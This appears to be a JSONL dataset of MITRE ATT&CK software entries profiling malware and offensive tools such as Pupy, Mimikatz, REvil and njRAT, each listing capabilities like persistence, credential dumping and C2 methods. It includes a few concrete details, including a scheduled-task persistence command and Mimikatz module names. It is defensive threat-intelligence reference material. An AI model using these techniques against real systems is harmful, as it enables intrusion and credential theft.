{"text": " [FlawedGrace](https://attack.mitre.org/software/S0383) is a fully featured remote access tool (RAT) written in C++ that was first observed in late 2017.(Citation: Proofpoint TA505 Jan 2019)", "idx": "https://attack.mitre.org/software/S0383", "title": "FlawedGrace", "entity": "FlawedGrace", "entity_type": "software", "entity_context": ["FlawedGrace encrypts its C2 configuration files with AES in CBC mode.", "FlawedGrace has used port 443 for C2 communications."], "is_subtechnique": false}
{"text": " [Pupy](https://attack.mitre.org/software/S0192) is an open source, cross-platform (Windows, Linux, OSX, Android) remote administration and post-exploitation tool. (Citation: GitHub Pupy) It is written in Python and can be generated as a payload in several different ways (Windows exe, Python file, PowerShell oneliner/file, Linux elf, APK, Rubber Ducky, etc.). (Citation: GitHub Pupy) [Pupy](https://attack.mitre.org/software/S0192) is publicly available on GitHub. (Citation: GitHub Pupy)", "idx": "https://attack.mitre.org/software/S0192", "title": "Pupy", "entity": "Pupy", "entity_type": "software", "entity_context": ["Pupy can compress data with Zip before sending it over C2.", "Pupy can user PowerView to execute “net user” commands and create domain accounts.", "Pupy can interact with a victim’s Outlook session and look through folders and emails.", "Pupy has a module for loading and executing PowerShell scripts.", "Pupy can use Lazagne for harvesting credentials.", "Pupy can grab a system’s information including the OS version, architecture, etc.", "Pupy has a module that checks a number of indicators on the system to determine if its running on a virtual machine.", "Pupy can bypass Windows UAC through either DLL hijacking, eventvwr, or appPaths.", "Pupy uses PsExec to execute a payload or commands on a remote host.", "Pupy can enumerate local information for Linux hosts and find currently logged on users for Windows hosts.", "Pupy has a module to clear event logs with PowerShell.", "Pupy can access a connected webcam and capture pictures.", "Pupy can migrate into another process using reflective DLL injection.", "Pupy can execute Lazagne as well as Mimikatz using PowerShell.", "Pupy's default encryption for its C2 communication channel is SSL, but it also has transport options for RSA and AES.", "Pupy can be used to establish persistence using a systemd service.", "Pupy has a built-in utility command for <code>netstat</code>, can do net session through PowerView, and has an interactive shell which can be used to discover additional information.", "Pupy can use an add on feature when creating payloads that allows you to create custom Python scripts (“scriptlets”) to perform tasks offline (without requiring a session) such as sandbox detection, adding persistence, etc.", "Pupy adds itself to the startup folder or adds itself to the Registry key <code>SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run</code> for persistence.", "Pupy uses a keylogger to capture keystrokes it then sends back to the server after it is stopped.", "Pupy can walk through directories and recursively search for strings in files.", "Pupy can also perform pass-the-ticket.", "Pupy can enable/disable RDP connection and can start a remote desktop session using a browser web socket client.", "Pupy can record sound with the microphone.", "Pupy can upload and download to/from a victim machine.", "Pupy can list local and remote shared drives and folders over SMB.", "Pupy can user PowerView to execute “net user” commands and create local system accounts.", "Pupy can send screenshots files, keylogger data, files, and recorded audio back to the C2 server.", "Pupy can communicate over HTTP for C2.", "Pupy can drop a mouse-logger that will take small screenshots around at each click and then send back to the server.", "Pupy uses PowerView and Pywerview to perform discovery commands such as net user, net group, net local group, etc.", "Pupy can obtain a list of SIDs and provide the option for selecting process tokens to impersonate.", "Pupy has a built-in module for port scanning.", "Pupy has built in commands to identify a host’s IP address and find out other network configuration settings by viewing connected sessions.", "Pupy can sniff plaintext network credentials and use NBNS Spoofing to poison name services.", "Pupy can list the running processes and get the process ID and parent process’s ID."], "is_subtechnique": false}
{"text": " [EKANS](https://attack.mitre.org/software/S0605) is ransomware variant that first appeared in mid-December 2019. [EKANS](https://attack.mitre.org/software/S0605) is distinct from other ransomware as it was written in Golang and aims to stop services and processes related to Industrial Control Systems.(Citation: Dragos EKANS)(Citation: Palo Alto Unit 42 EKANS)", "idx": "https://attack.mitre.org/software/S0605", "title": "EKANS", "entity": "EKANS", "entity_type": "software", "entity_context": ["EKANS uses standard encryption library functions to encrypt files.", "EKANS removes backups of Volume Shadow Copies to disable any restoration capabilities.", "EKANS has been disguised as <code>update.exe</code> to appear as a valid executable.", "EKANS can use Windows Mangement Instrumentation (WMI) calls to execute operations.", "EKANS can determine the domain of a compromised host.", "EKANS uses encoded strings in its process kill list. ", "EKANS looks for processes from a hard-coded list.", "EKANS stops processes related to security and management software.", "EKANS stops database, data backup solution, antivirus, and ICS-related processes."], "is_subtechnique": false}
{"text": " [FlawedAmmyy](https://attack.mitre.org/software/S0381) is a remote access tool (RAT) that was first seen in early 2016. The code for [FlawedAmmyy](https://attack.mitre.org/software/S0381) was based on leaked source code for a version of Ammyy Admin, a remote access software.(Citation: Proofpoint TA505 Mar 2018)", "idx": "https://attack.mitre.org/software/S0381", "title": "FlawedAmmyy", "entity": "FlawedAmmyy", "entity_type": "software", "entity_context": ["FlawedAmmyy has used SEAL encryption during the initial C2 handshake.", "FlawedAmmyy will attempt to detect anti-virus products during the initial infection.", "FlawedAmmyy has used HTTP for C2.", "FlawedAmmyy will attempt to detect if a usable smart card is current inserted into a card reader.", "FlawedAmmyy beacons out the victim operating system and computer name during the initial infection.", "FlawedAmmyy enumerates the privilege level of the victim during the initial infection.", "FlawedAmmyy enumerates the current user during the initial infection.", "FlawedAmmyy may obfuscate portions of the initial C2 handshake.", "FlawedAmmyy has used port 443 for C2.", "FlawedAmmyy leverages WMI to enumerate anti-virus on the victim."], "is_subtechnique": false}
{"text": " [UACMe](https://attack.mitre.org/software/S0116) is an open source assessment tool that contains many methods for bypassing Windows User Account Control on multiple versions of the operating system. (Citation: Github UACMe)", "idx": "https://attack.mitre.org/software/S0116", "title": "UACMe", "entity": "UACMe", "entity_type": "software", "entity_context": ["UACMe contains many methods for bypassing Windows User Account Control on multiple versions of the operating system."], "is_subtechnique": false}
{"text": " [GoldenSpy](https://attack.mitre.org/software/S0493) is a backdoor malware which has been packaged with legitimate tax preparation software. [GoldenSpy](https://attack.mitre.org/software/S0493) was discovered targeting organizations in China, being delivered with the \"Intelligent Tax\" software suite which is produced by the Golden Tax Department of Aisino Credit Information Co. and required to pay local taxes.(Citation: Trustwave GoldenSpy June 2020)", "idx": "https://attack.mitre.org/software/S0493", "title": "GoldenSpy", "entity": "GoldenSpy", "entity_type": "software", "entity_context": ["GoldenSpy's setup file installs initial executables under the folder <code>%WinDir%\\System32\\PluginManager</code>.\t", "GoldenSpy has included a program \"ExeProtector\", which monitors for the existence of GoldenSpy on the infected system and redownloads if necessary.\t", "GoldenSpy can execute remote commands via the command-line interface.\t", "GoldenSpy's uninstaller can delete registry entries, files and folders, and finally itself once these tasks have been completed.", "GoldenSpy has exfiltrated host environment information to an external C2 domain via port 9006.\t", "GoldenSpy's installer has delayed installation of GoldenSpy for two hours after it reaches a victim system.\t", "GoldenSpy's uninstaller has base64-encoded its variables. ", "GoldenSpy can create new users on an infected system.\t", "GoldenSpy can execute remote commands in the Windows command shell using the <code>WinExec()</code> API.\t", "GoldenSpy constantly attempts to download and execute files from the remote C2, including GoldenSpy itself if not found on the system.\t", "GoldenSpy has used the Ryeol HTTP Client to facilitate HTTP internet communication.", "GoldenSpy has been packaged with a legitimate tax preparation software.", "GoldenSpy has established persistence by running in the background as an autostart service.\t", "GoldenSpy has used HTTP over ports 9005 and 9006 for network traffic, 9002 for C2 requests, 33666 as a WebSocket, and 8090 to download files.", "GoldenSpy has gathered operating system information.\t"], "is_subtechnique": false}
{"text": " [Siloscape](https://attack.mitre.org/software/S0623) is malware that targets Kubernetes clusters through Windows containers. [Siloscape](https://attack.mitre.org/software/S0623) was first observed in March 2021.(Citation: Unit 42 Siloscape Jun 2021)", "idx": "https://attack.mitre.org/software/S0623", "title": "Siloscape", "entity": "Siloscape", "entity_type": "software", "entity_context": ["Siloscape searches for the kubectl binary.", "Siloscape uses Tor to communicate with C2.", "Siloscape has decrypted the password of the C2 server with a simple byte by byte XOR. Siloscape also writes both an archive of Tor and the <code>unzip</code> binary to disk from data embedded within the payload using Visual Studio’s Resource Manager.", "Siloscape can send kubectl commands to victim clusters through an IRC channel and can run kubectl locally to spread once within a victim cluster.", "Siloscape maps the host’s C drive to the container by creating a global symbolic link to the host through the calling of <code>NtSetInformationSymbolicLink</code>.", "Siloscape is executed after the attacker gains initial access to a Windows container using a known vulnerability. ", " Siloscape searches for the Kubernetes config file and other related files using a regular expression. ", "Siloscape can run cmd through an IRC channel.", "Siloscape impersonates the main thread of <code>CExecSvc.exe</code> by calling <code>NtImpersonateThread</code>.", "Siloscape checks for Kubernetes node permissions.", "Siloscape itself is obfuscated and uses obfuscated API calls.", "Siloscape makes various native API calls.", "Siloscape has leveraged a vulnerability in Windows containers to perform an Escape to Host.", "Siloscape connects to an IRC server for C2."], "is_subtechnique": false}
{"text": " [PUNCHBUGGY](https://attack.mitre.org/software/S0196) is a backdoor malware used by [FIN8](https://attack.mitre.org/groups/G0061) that has been observed targeting POS networks in the hospitality industry. (Citation: Morphisec ShellTea June 2019)(Citation: FireEye Fin8 May 2016) (Citation: FireEye Know Your Enemy FIN8 Aug 2016)", "idx": "https://attack.mitre.org/software/S0196", "title": "PUNCHBUGGY", "entity": "PUNCHBUGGY", "entity_type": "software", "entity_context": ["PUNCHBUGGY has saved information to a random temp file before exfil.", "PUNCHBUGGY has used python scripts.", "PUNCHBUGGY has Gzipped information and saved it to a random temp file before exfil.\t", "PUNCHBUGGY can gather AVs registered in the system.\t", "PUNCHBUGGY has used PowerShell scripts.", "PUNCHBUGGY mimics filenames from %SYSTEM%\\System32 to hide DLLs in %WINDIR% and/or %TEMP%.", "PUNCHBUGGY can load a DLL using Rundll32.", "PUNCHBUGGY has hashed most its code's functions and encrypted payloads with base64 and XOR.", "PUNCHBUGGY can load a DLL using the LoadLibrary API.", "PUNCHBUGGY has been observed using a Registry Run key.", "PUNCHBUGGY can download additional files and payloads to compromised hosts.", "PUNCHBUGGY enables remote interaction and can obtain additional code over HTTPS GET and POST requests.", "PUNCHBUGGY can delete files written to disk.", "PUNCHBUGGY can gather user names.", "PUNCHBUGGY can gather system information such as computer names.\t", "PUNCHBUGGY can establish using a AppCertDLLs Registry key.", "PUNCHBUGGY has used PowerShell to decode base64-encoded assembly."], "is_subtechnique": false}
{"text": " [Mimikatz](https://attack.mitre.org/software/S0002) is a credential dumper capable of obtaining plaintext Windows account logins and passwords, along with many other features that make it useful for testing the security of networks. (Citation: Deply Mimikatz) (Citation: Adsecurity Mimikatz Guide)", "idx": "https://attack.mitre.org/software/S0002", "title": "Mimikatz", "entity": "Mimikatz", "entity_type": "software", "entity_context": ["Mimikatz performs credential dumping to obtain account and password information useful in gaining access to additional systems and enterprise network resources. It contains functionality to acquire information about credentials in many ways, including from DPAPI.\t", "The Mimikatz credential dumper has been extended to include Skeleton Key domain controller authentication bypass functionality. The <code>LSADUMP::ChangeNTLM</code> and <code>LSADUMP::SetNTLM</code> modules can also manipulate the password hash of an account without knowing the clear text value.", "Mimikatz's kerberos module can create golden tickets.", "Mimikatz’s <code>LSADUMP::DCShadow</code> module can be used to make AD updates by temporarily setting a computer to be a DC.", "Mimikatz's kerberos module can create silver tickets.", "The Mimikatz credential dumper contains an implementation of an SSP.", "Mimikatz contains functionality to acquire credentials from the Windows Credential Manager.", "Mimikatz performs credential dumping to obtain account and password information useful in gaining access to additional systems and enterprise network resources. It contains functionality to acquire information about credentials in many ways, including from DCSync/NetSync.", "Mimikatz’s <code>LSADUMP::DCSync</code> and <code>KERBEROS::PTT</code> modules implement the three steps required to extract the krbtgt account hash and create/use Kerberos tickets.", "Mimikatz's <code>SEKURLSA::Pth</code> module can impersonate a user, with only a password hash, to execute arbitrary commands.", "Mimikatz performs credential dumping to obtain account and password information useful in gaining access to additional systems and enterprise network resources. It contains functionality to acquire information about credentials in many ways, including from the LSA.", "Mimikatz's <code>CRYPTO::Extract</code> module can extract keys by interacting with Windows cryptographic application programming interface (API) functions.", "Mimikatz performs credential dumping to obtain account and password information useful in gaining access to additional systems and enterprise network resources. It contains functionality to acquire information about credentials in many ways, including from the SAM table.", "Mimikatz performs credential dumping to obtain account and password information useful in gaining access to additional systems and enterprise network resources. It contains functionality to acquire information about credentials in many ways, including from the LSASS Memory.", "Mimikatz's <code>MISC::AddSid</code> module can appended any SID or user/group account to a user's SID-History. Mimikatz also utilizes SID-History Injection to expand the scope of other components such as generated Kerberos Golden Tickets and DCSync beyond a single domain.", "Mimikatz performs credential dumping to obtain account and password information useful in gaining access to additional systems and enterprise network resources. It contains functionality to acquire information about credentials in many ways, including from the credential vault and DPAPI.\t"], "is_subtechnique": false}
{"text": " [WellMess](https://attack.mitre.org/software/S0514) is lightweight malware family with variants written in .NET and Golang that has been in use since at least 2018 by [APT29](https://attack.mitre.org/groups/G0016).(Citation: CISA WellMess July 2020)(Citation: PWC WellMess July 2020)(Citation: NCSC APT29 July 2020)", "idx": "https://attack.mitre.org/software/S0514", "title": "WellMess", "entity": "WellMess", "entity_type": "software", "entity_context": ["WellMess can communicate to C2 with mutual TLS where client and server mutually check certificates.", "WellMess can encrypt HTTP POST data using RC6 and a dynamically generated AES key encrypted with a hard coded RSA public key.", "WellMess can identify the IP address and user domain on the target machine.", "WellMess can write files to a compromised host.", "WellMess can execute PowerShell scripts received from C2.", "WellMess can execute command line scripts received from C2.", "WellMess can use junk data in the Base64 string for additional obfuscation.", "WellMess has the ability to use DNS tunneling for C2 communications.", "WellMess can identify domain group membership for the current user.", "WellMess can decode and decrypt data received from C2.", "WellMess can send files from the victim machine to C2.", "WellMess can use HTTP and HTTPS in C2 communications.", "WellMess can identify the computer name of a compromised host.", "WellMess has used Base64 encoding to uniquely identify communication to and from the C2.", "WellMess can collect the username on the victim machine to send to C2."], "is_subtechnique": false}
{"text": " [WinMM](https://attack.mitre.org/software/S0059) is a full-featured, simple backdoor used by [Naikon](https://attack.mitre.org/groups/G0019). (Citation: Baumgartner Naikon 2015)", "idx": "https://attack.mitre.org/software/S0059", "title": "WinMM", "entity": "WinMM", "entity_type": "software", "entity_context": ["WinMM is usually configured with primary and backup domains for C2 communications.", "WinMM sets a WH_CBT Windows hook to search for and capture files on the victim.", "WinMM sets a WH_CBT Windows hook to collect information on process creation.", "WinMM uses HTTP for C2.", "WinMM uses NetUser-GetInfo to identify that it is running under an “Admin” account on the local system.", "WinMM collects the system name, OS version including service pack, and system install date and sends the information to the C2 server."], "is_subtechnique": false}
{"text": " [Exaramel for Linux](https://attack.mitre.org/software/S0401) is a backdoor written in the Go Programming Language and compiled as a 64-bit ELF binary. The Windows version is tracked separately under [Exaramel for Windows](https://attack.mitre.org/software/S0343).(Citation: ESET TeleBots Oct 2018)", "idx": "https://attack.mitre.org/software/S0401", "title": "Exaramel for Linux", "entity": "Exaramel for Linux", "entity_type": "software", "entity_context": ["Exaramel for Linux has a hardcoded location under systemd that it uses to achieve persistence if it is running as root.", "Exaramel for Linux can uninstall its persistence mechanism and delete its configuration file.", "Exaramel for Linux has a command to download a file from  and to a remote C2 server.", "Exaramel for Linux uses HTTPS for C2 communications.", "Exaramel for Linux can run <code>whoami</code> to identify the system owner.", "Exaramel for Linux can decrypt its configuration file.", "Exaramel for Linux can execute commands with high privileges via a specific binary with setuid functionality.", "Exaramel for Linux uses RC4 for encrypting the configuration.", "Exaramel for Linux has a command to execute a shell command on the system.", "Exaramel for Linux has a hardcoded location that it uses to achieve persistence if the startup system is Upstart or System V and it is running as root.", "Exaramel for Linux can attempt to find a new C2 server if it receives an error.", "Exaramel for Linux uses crontab for persistence if it does not have root privileges."], "is_subtechnique": false}
{"text": " [SodaMaster](https://attack.mitre.org/software/S0627) is a fileless malware used by [menuPass](https://attack.mitre.org/groups/G0045) to download and execute payloads since at least 2020.(Citation: Securelist APT10 March 2021)", "idx": "https://attack.mitre.org/software/S0627", "title": "SodaMaster", "entity": "SodaMaster", "entity_type": "software", "entity_context": ["SodaMaster can check for the presence of the Registry key <code>HKEY_CLASSES_ROOT\\\\Applications\\\\VMwareHostOpen.exe</code> before proceeding to its main functionality.\t ", "SodaMaster can use <code>RegOpenKeyW</code> to access the Registry.", "SodaMaster can use RC4 to encrypt C2 communications.", "SodaMaster can use a hardcoded RSA key to encrypt some of its C2 traffic.", "SodaMaster can search a list of running processes.", "SodaMaster has the ability to download additional payloads from C2 to the targeted system.", "SodaMaster can use \"stackstrings\" for obfuscation.", "SodaMaster can identify the username on a compromised host.", "SodaMaster can enumerate the host name and OS version on a target system.", "SodaMaster has the ability to query the Registry to detect a key specific to VMware.", "SodaMaster has the ability to put itself to \"sleep\" for a specified time."], "is_subtechnique": false}
{"text": " [Kerrdown](https://attack.mitre.org/software/S0585) is a custom downloader that has been used by [APT32](https://attack.mitre.org/groups/G0050) since at least 2018 to install spyware from a server on the victim's network.(Citation: Amnesty Intl. Ocean Lotus February 2021)(Citation: Unit 42 KerrDown February 2019)", "idx": "https://attack.mitre.org/software/S0585", "title": "Kerrdown", "entity": "Kerrdown", "entity_type": "software", "entity_context": ["Kerrdown has been distributed through malicious e-mail attachments.", "Kerrdown can download specific payloads to a compromised host based on OS architecture.", "Kerrdown has gained execution through victims opening malicious files.", "Kerrdown can use DLL side-loading to load malicious DLLs.", "Kerrdown has gained execution through victims opening malicious links.", "Kerrdown can use a VBS base64 decoder function published by Motobit.", "Kerrdown can encrypt, encode, and compress multiple layers of shellcode.", "Kerrdown has been distributed via e-mails containing a malicious link.", "Kerrdown has the ability to determine if the compromised host is running a 32 or 64 bit OS architecture.", "Kerrdown can decode, decrypt, and decompress multiple layers of shellcode."], "is_subtechnique": false}
{"text": " [xCmd](https://attack.mitre.org/software/S0123) is an open source tool that is similar to [PsExec](https://attack.mitre.org/software/S0029) and allows the user to execute applications on remote systems. (Citation: xCmd)", "idx": "https://attack.mitre.org/software/S0123", "title": "xCmd", "entity": "xCmd", "entity_type": "software", "entity_context": ["xCmd can be used to execute binaries on remote systems by creating and starting a service."], "is_subtechnique": false}
{"text": " [REvil](https://attack.mitre.org/software/S0496) is a ransomware family that has been linked to the [GOLD SOUTHFIELD](https://attack.mitre.org/groups/G0115) group and operated as ransomware-as-a-service (RaaS) since at least April 2019. [REvil](https://attack.mitre.org/software/S0496) is highly configurable and shares code similarities with the GandCrab RaaS.(Citation: Secureworks REvil September 2019)(Citation: Intel 471 REvil March 2020)(Citation: Group IB Ransomware May 2020)", "idx": "https://attack.mitre.org/software/S0496", "title": "REvil", "entity": "REvil", "entity_type": "software", "entity_context": ["REvil can launch an instance of itself with administrative rights using runas.", "REvil has been distributed via malicious e-mail attachments including MS Word Documents.", "REvil can inject itself into running processes on a compromised host.", "REvil can use vssadmin to delete volume shadow copies and bcdedit to disable recovery features.", "REvil can force a reboot in safe mode with networking.", "REvil can identify the username, machine name, system language, keyboard layout, OS version, and system drive information on a compromised host.", "REvil can check the system language using <code>GetUserDefaultUILanguage</code> and <code>GetSystemDefaultUILanguage</code>. If the language is found in the list, the process terminates.\n", "REvil can obtain the token from the user that launched the explorer.exe process to avoid affecting the desktop of the SYSTEM user.", "REvil has used HTTP and HTTPS in communication with C2.", "REvil can download a copy of itself from an attacker controlled IP address to the victim machine.", "REvil can use the Windows command line to delete volume shadow copies and disable recovery.", "REvil has been executed via malicious MS Word e-mail attachments.", "REvil has encrypted C2 communications with the ECIES algorithm.", "REvil can encrypt files on victim systems and demands a ransom to decrypt the files.", "REvil can mark its binary code for deletion after reboot.", "REvil has the ability to identify specific files and directories that are not to be encrypted.", "REvil can decode encrypted strings to enable execution of commands and payloads.", "REvil can query the Registry to get random file extensions to append to encrypted files.", "REvil has used PowerShell to delete volume shadow copies and download files.", "REvil has used encrypted strings and configuration files.", "REvil can save encryption parameters and system information to the Registry.", "REvil has used obfuscated VBA macros for execution.", "REvil can mimic the names of known executables.", "REvil can connect to and disable the Symantec server on the victim's network.", "REvil can exfiltrate host and malware information to C2 servers.", "REvil can use WMI to monitor for and kill specific processes listed in its configuration file.", "REvil has the capability to stop services and kill processes.", "REvil has the capability to destroy files and folders.", "REvil has infected victim machines through compromised websites and exploit kits.", "REvil can identify the domain membership of a compromised host.", "REvil can enumerate active services.", "REvil can use Native API for execution and to retrieve active services."], "is_subtechnique": false}
{"text": " [yty](https://attack.mitre.org/software/S0248) is a modular, plugin-based malware framework. The components of the framework are written in a variety of programming languages. (Citation: ASERT Donot March 2018)", "idx": "https://attack.mitre.org/software/S0248", "title": "yty", "entity": "yty", "entity_type": "software", "entity_context": ["yty gathers the computer name, the serial number of the main disk volume, CPU information, Microsoft Windows version, and runs the command <code>systeminfo</code>.", "yty uses the <code>net view</code> command for discovery.", "yty establishes persistence by creating a scheduled task with the command <code>SchTasks /Create /SC DAILY /TN BigData /TR “ + path_file + “/ST 09:30“</code>.", "yty collects files with the following extensions: .ppt, .pptx, .pdf, .doc, .docx, .xls, .xlsx, .docm, .rtf, .inp, .xlsm, .csv, .odt, .pps, .vcf and sends them back to the C2 server.", "yty communicates to the C2 server by retrieving a Google Doc.", "yty gathers information on victim’s drives and has a plugin for document listing.", "yty collects screenshots of the victim machine.", "yty runs <code>ipconfig /all</code> and collects the domain name.", "yty collects the victim’s username.", "yty contains junk code in its binary, likely to confuse malware analysts.", "yty uses a keylogger plugin to gather keystrokes.", "yty has some basic anti-sandbox detection that tries to detect Virtual PC, Sandboxie, and VMware. ", "yty gets an output of running processes using the <code>tasklist</code> command.", "yty packs a plugin with UPX."], "is_subtechnique": false}
{"text": " [PUNCHTRACK](https://attack.mitre.org/software/S0197) is non-persistent point of sale (POS) system malware utilized by [FIN8](https://attack.mitre.org/groups/G0061) to scrape payment card data. (Citation: FireEye Fin8 May 2016) (Citation: FireEye Know Your Enemy FIN8 Aug 2016)", "idx": "https://attack.mitre.org/software/S0197", "title": "PUNCHTRACK", "entity": "PUNCHTRACK", "entity_type": "software", "entity_context": ["PUNCHTRACK scrapes memory for properly formatted payment card data.", "PUNCHTRACK is loaded and executed by a highly obfuscated launcher.", "PUNCHTRACK aggregates collected data in a tmp file."], "is_subtechnique": false}
{"text": " [MoonWind](https://attack.mitre.org/software/S0149) is a remote access tool (RAT) that was used in 2016 to target organizations in Thailand. (Citation: Palo Alto MoonWind March 2017)", "idx": "https://attack.mitre.org/software/S0149", "title": "MoonWind", "entity": "MoonWind", "entity_type": "software", "entity_context": ["MoonWind obtains the victim's current time.", "MoonWind encrypts C2 traffic using RC4 with a static key.", "MoonWind saves information from its keylogging routine as a .zip file in the present working directory.", "MoonWind completes network communication via raw sockets.", "MoonWind can obtain the victim hostname, Windows version, RAM amount, number of drives, and screen resolution.", "MoonWind can execute commands via an interactive command shell. MoonWind uses batch scripts for various purposes, including to restart and uninstall itself.", "MoonWind installs itself as a new service with automatic startup to establish persistence. The service checks every 60 seconds to determine if the malware is running; if not, it will spawn a new instance.", "MoonWind can delete itself or specified files.", "MoonWind has a command to return a directory listing for a specified directory.", "MoonWind communicates over ports 80, 443, 53, and 8080 via raw sockets instead of the protocols usually associated with the ports.", "MoonWind has a keylogger.", "MoonWind obtains the victim username.", "MoonWind obtains the number of removable drives from the victim.", "MoonWind obtains the victim IP address.", "MoonWind has a command to return a list of running processes."], "is_subtechnique": false}
{"text": " [Explosive](https://attack.mitre.org/software/S0569) is a custom-made remote access tool used by the group [Volatile Cedar](https://attack.mitre.org/groups/G0123). It was first identified in the wild in 2015.(Citation: CheckPoint Volatile Cedar March 2015)(Citation: ClearSky Lebanese Cedar Jan 2021)", "idx": "https://attack.mitre.org/software/S0569", "title": "Explosive", "entity": "Explosive", "entity_type": "software", "entity_context": ["Explosive has commonly set file and path attributes to hidden.", "Explosive has a function to use the OpenClipboard wrapper. ", "Explosive has collected the username from the infected host. ", "Explosive has used HTTP for communication.", "Explosive has encrypted communications with the RC4 method. ", " Explosive has collected the MAC address from the victim's machine. ", "Explosive can scan all .exe files located in the USB drive. ", "Explosive has a function to write itself to Registry values. ", "Explosive has leveraged its keylogging capabilities to gain access to administrator accounts on target servers. ", "Explosive has a function to call the OpenClipboard wrapper.  ", "Explosive has collected the computer name from the infected host. ", "Explosive has a function to download a file to the infected system. "], "is_subtechnique": false}
{"text": " [CARROTBALL](https://attack.mitre.org/software/S0465) is an FTP downloader utility that has been in use since at least 2019. [CARROTBALL](https://attack.mitre.org/software/S0465) has been used as a downloader to install [SYSCON](https://attack.mitre.org/software/S0464).(Citation: Unit 42 CARROTBAT January 2020)", "idx": "https://attack.mitre.org/software/S0465", "title": "CARROTBALL", "entity": "CARROTBALL", "entity_type": "software", "entity_context": ["CARROTBALL has the ability to download and install a remote payload.", "CARROTBALL has used a custom base64 alphabet to decode files.", "CARROTBALL has the ability to use FTP in C2 communications.", "CARROTBALL has been executed through users being lured into opening malicious e-mail attachments."], "is_subtechnique": false}
{"text": " [Orz](https://attack.mitre.org/software/S0229) is a custom JavaScript backdoor used by [Leviathan](https://attack.mitre.org/groups/G0065). It was observed being used in 2014 as well as in August 2017 when it was dropped by Microsoft Publisher files. (Citation: Proofpoint Leviathan Oct 2017) (Citation: FireEye Periscope March 2018)", "idx": "https://attack.mitre.org/software/S0229", "title": "Orz", "entity": "Orz", "entity_type": "software", "entity_context": ["Some Orz strings are base64 encoded, such as the embedded DLL known as MockDll.", "Orz can gather victim drive information.", "Orz has used Technet and Pastebin web pages for command and control.", "Orz can overwrite Registry settings to reduce its visibility on the victim.", "Orz can download files onto the victim.", "Orz can gather a process list from the victim.", "Orz can gather victim proxy information.", "Orz can gather the victim's Internet Explorer version.", "Some Orz versions have an embedded DLL known as MockDll that uses Process Hollowing and regsvr32 to execute another payload.", "Orz can gather the victim OS version and whether it is 64 or 32 bit.", "Orz can execute shell commands. Orz can execute commands with JavaScript.", "Some Orz versions have an embedded DLL known as MockDll that uses process hollowing and Regsvr32 to execute another payload."], "is_subtechnique": false}
{"text": " [Peppy](https://attack.mitre.org/software/S0643) is a Python-based remote access Trojan, active since at least 2012, with similarities to [Crimson](https://attack.mitre.org/software/S0115).(Citation: Proofpoint Operation Transparent Tribe March 2016)", "idx": "https://attack.mitre.org/software/S0643", "title": "Peppy", "entity": "Peppy", "entity_type": "software", "entity_context": ["Peppy can use HTTP to communicate with C2.", "Peppy can take screenshots on targeted systems.", "Peppy can identify specific files for exfiltration.", "Peppy has the ability to automatically exfiltrate files and keylogs.", "Peppy has the ability to execute shell commands.", "Peppy can log keystrokes on compromised hosts.", "Peppy can download and execute remote files."], "is_subtechnique": false}
{"text": " [MCMD](https://attack.mitre.org/software/S0500) is a remote access tool that provides remote command shell capability used by [Dragonfly 2.0](https://attack.mitre.org/groups/G0074).(Citation: Secureworks MCMD July 2019)", "idx": "https://attack.mitre.org/software/S0500", "title": "MCMD", "entity": "MCMD", "entity_type": "software", "entity_context": ["MCMD can use scheduled tasks for persistence.", "MCMD can Base64 encode output strings prior to sending to C2.", "MCMD can launch a console process (cmd.exe) with redirected standard input and output.", "MCMD has the ability to remove set Registry Keys.", "MCMD can upload additional files to a compromised host.", "MCMD has been named Readme.txt to appear legitimate.", "MCMD can use Registry Run Keys for persistence.", "MCMD has the ability to upload files from an infected device.", "MCMD can use HTTPS in communication with C2 web servers.", "MCMD can modify processes to prevent them from being visible on the desktop."], "is_subtechnique": false}
{"text": " [SOUNDBITE](https://attack.mitre.org/software/S0157) is a signature backdoor used by [APT32](https://attack.mitre.org/groups/G0050). (Citation: FireEye APT32 May 2017)", "idx": "https://attack.mitre.org/software/S0157", "title": "SOUNDBITE", "entity": "SOUNDBITE", "entity_type": "software", "entity_context": ["SOUNDBITE is capable of enumerating and manipulating files and directories.", "SOUNDBITE is capable of enumerating application windows.", "SOUNDBITE is capable of gathering system information.", "SOUNDBITE communicates via DNS for C2.", "SOUNDBITE is capable of modifying the Registry."], "is_subtechnique": false}
{"text": " [njRAT](https://attack.mitre.org/software/S0385) is a remote access tool (RAT) that was first observed in 2012. It has been used by threat actors in the Middle East.(Citation: Fidelis njRAT June 2013)", "idx": "https://attack.mitre.org/software/S0385", "title": "njRAT", "entity": "njRAT", "entity_type": "software", "entity_context": ["njRAT has used port 1177 for HTTP C2 communications.", "njRAT uses Base64 encoding for C2 traffic.", "njRAT enumerates the current user during the initial infection.", "njRAT can be configured to spread via removable drives.", "njRAT can read specific registry values.", "njRAT has used a fast flux DNS for C2 IP resolution.", "njRAT has executed PowerShell commands via auto-run registry key persistence.", "njRAT is capable of deleting objects related to itself (registry keys, files, and firewall rules) on the victim.", "njRAT has included a base64 encoded executable.", "njRAT has used the ShellExecute() function within a script.", "njRAT can search a list of running processes for Tr.exe.", "njRAT can launch a command shell interface for executing commands.", "njRAT has used AutoIt to compile the payload and main script into a single executable after delivery.", "njRAT has added persistence via the Registry key <code>HKCU\\Software\\Microsoft\\CurrentVersion\\Run\\</code> and dropped a shortcut in <code>%STARTUP%</code>.", "njRAT has used HTTP to receive stolen information from the infected machine.\t", "njRAT has modified the Windows firewall to allow itself to communicate through the firewall.", "njRAT can browse file systems using a file manager module.", "njRAT can collect data from a local system.", "njRAT is capable of logging keystrokes.", "njRAT can identify remote hosts on connected networks.", "njRAT enumerates the victim operating system and computer name during the initial infection.", "njRAT can create, delete, or modify a specified Registry key or value.", "njRAT can access the victim's webcam.", "njRAT has used HTTP for C2 communications.", "njRAT has a module that steals passwords saved in victim web browsers.", "njRAT gathers information about opened windows during the initial infection.", "njRAT will attempt to detect if the victim system has a camera during the initial infection. njRAT can also detect any removable drives connected to the system.", "njRAT can download files to the victim’s machine.", "njRAT has a module for performing remote desktop access.", "njRAT can capture screenshots of the victim’s machines."], "is_subtechnique": false}
